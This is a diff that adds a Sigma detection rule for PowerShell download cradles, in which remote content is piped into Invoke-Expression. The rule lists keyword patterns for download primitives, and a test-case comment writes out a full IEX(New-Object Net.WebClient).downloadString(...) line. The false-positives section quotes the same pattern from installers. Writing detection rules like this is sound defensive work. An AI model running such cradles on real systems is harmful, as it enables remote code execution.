@@ -1,0 +1,51 @@
+title: PowerShell Download Cradle via IEX and WebClient/Net.Http
+id: 4b7e1c9a-2d6f-4a83-9e5b-7c1f8a3d6e42
+status: experimental
+description: |
+    Detects PowerShell script block content that downloads remote data
+    and pipes it directly into Invoke-Expression (IEX), a classic
+    "download cradle" pattern used to fetch and execute a payload in
+    memory without writing it to disk. Matches common variants using
+    Net.WebClient, Net.Http.HttpClient, or the WebRequest/RestMethod
+    cmdlets combined with IEX or Invoke-Expression.
+
+    Severity is high, not critical: the combination of a network
+    download primitive and IEX in the same script block is a strong
+    precursor to arbitrary code execution and has few legitimate uses
+    outside of software bootstrapping installers, so confidence is
+    high — but tools like Chocolatey's install script and some vendor
+    deployment scripts use this exact pattern intentionally, which
+    keeps it just short of critical.
+references:
+    - https://attack.mitre.org/techniques/T1059/001/
+author: Detection Engineering Team
+date: 2026-07-14
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: ps_script
+    product: windows
+# Test case:
+#   PowerShell Script Block Logging (EventID 4104) capturing:
+#   IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')
+detection:
+    selection_execute:
+        ScriptBlockText|contains:
+            - 'IEX'
+            - 'Invoke-Expression'
+    selection_download:
+        ScriptBlockText|contains:
+            - 'Net.WebClient'
+            - 'DownloadString'
+            - 'DownloadFile'
+            - 'DownloadData'
+            - 'Net.Http.HttpClient'
+            - 'Invoke-WebRequest'
+            - 'Invoke-RestMethod'
+    condition: selection_execute and selection_download
+falsepositives:
+    - Software bootstrapping installers such as Chocolatey's install.ps1, which intentionally runs `iex ((New-Object System.Net.WebClient).DownloadString(...))` to fetch and run the package manager installer
+    - Internal deployment or configuration-management scripts that pull a config or module from a trusted internal web server and execute it
+    - PowerShell Gallery / OneGet module bootstrap snippets that follow the same download-then-execute pattern
+level: high
